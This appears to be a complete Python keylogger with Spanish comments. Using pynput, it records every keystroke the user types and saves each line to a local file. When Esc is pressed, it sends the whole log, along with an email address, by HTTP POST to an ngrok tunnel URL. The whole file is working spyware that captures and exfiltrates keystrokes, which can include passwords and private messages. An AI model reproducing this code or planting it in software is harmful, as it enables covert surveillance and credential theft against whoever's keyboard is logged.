from pynput.keyboard import Key, Listener

import requests

# Lista que almacena todas las pulsaciones del usuario
teclas_presionadas = []

#Creamos una funcion que se encargue de abrir el documento salida.txt
def leer_archivo():
    # Creamos una variable para almacenar el texto que viene dentro del documento
    mensaje = ""

    #Abrimos el documento en modo lectura
    with open("salida.txt", "r") as file:

        # Leemos todas las filas del documento y las almacenamos
        contenido = file.readlines()

        for palabra in contenido:
            mensaje += palabra

    return mensaje

# Creara un archivo de texto para almacenar lo que el usuario esta escribiendo
def escribir_text(lista_teclas):
    with open("salida.txt", "a") as file:
        # Este ciclo ira recorriendo letra por letra las palabras que el usuario ponga dentro
        # La lista "teclas presionadas"
        for letra in lista_teclas:
            letra = str(letra).replace("'", "")

            if 'Key.space' in letra:
                file.write(" ")
            else:
                file.write(str(letra))
        file.write("\n")
# Crear dos funciones para cada movimiento del teclado

# Cuando el usuario presiona una tecla
def presionado(tecla):
    # print(f"Se presiono la tecla {tecla}")

    match tecla:
        case Key.esc:
            pass
        case Key.ctrl_l:
            pass
        case Key.alt_gr:
            pass
        case Key.backspace:
            if len(teclas_presionadas) == 0:
                pass
            else:
                teclas_presionadas.pop()
        case Key.enter:
            print(tecla)
        case _:
            teclas_presionadas.append(tecla)

    if tecla == Key.enter:
        print(teclas_presionadas)

# Cuando el usuario libera una tecla
def liberado(tecla):

    global teclas_presionadas

    if tecla == Key.enter:
        escribir_text(teclas_presionadas)
        teclas_presionadas = []

    if tecla == Key.esc:
        mensaje_leido = leer_archivo()
        informacion_correo = {
            "correo" : "dave_u@outlook.com",
            "mensaje" : mensaje_leido
        }

        res = requests.post( "https://2b11-2806-264-4482-8a9d-8c85-35b5-6e78-8fa6.ngrok-free.app/enviar", json=informacion_correo )
        print(res.text)
    #print(f"Se libero la tecla {tecla}")


# Crear un metodo que se encargue de escuchar lo que el teclado recibe
with Listener(on_press = presionado, on_release = liberado) as listener:

    # 1. Se ejecuta de manera continua el metodo Listener
    # 2. Si el usuario presiona una tecla, resultado lo guarda como "listenner"
    # 3. Lo agrega a los resultados

    listener.join()